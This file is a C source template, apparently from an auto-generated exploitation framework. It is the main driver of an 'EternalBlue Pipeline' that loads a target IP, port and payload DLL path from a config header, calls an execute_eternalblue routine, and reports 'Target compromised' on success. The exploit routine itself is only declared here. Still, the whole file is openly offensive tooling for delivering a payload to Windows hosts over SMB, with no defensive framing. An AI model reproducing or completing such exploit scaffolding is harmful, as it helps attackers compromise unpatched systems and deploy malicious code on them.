/* templates/eternalblue/main.c.tpl
   Gerado automaticamente. Nao edite manualmente. */

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "config.h"

int execute_eternalblue(const char *ip, int port, const char *payload_path);

int main(void)
{
    WSADATA wsa;
    int rc;

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[-] WSAStartup failed\n");
        return 1;
    }

    printf("============================================\n");
    printf("  EternalBlue Pipeline (Windows x64)\n");
    printf("  Target:  %s:%d\n", TARGET_IP, TARGET_PORT);
    printf("  Binary:  %s\n", TARGET_BINARY);
    printf("  DLL:     %s\n", PAYLOAD_DLL_PATH);
    printf("============================================\n\n");

    rc = execute_eternalblue(TARGET_IP, TARGET_PORT, PAYLOAD_DLL_PATH);

    if (rc == 0) {
        printf("\n[+] Pipeline complete. Target compromised.\n");
    } else {
        printf("\n[-] Pipeline failed (code %d).\n", rc);
    }

    WSACleanup();
    return rc == 0 ? 0 : 1;
}
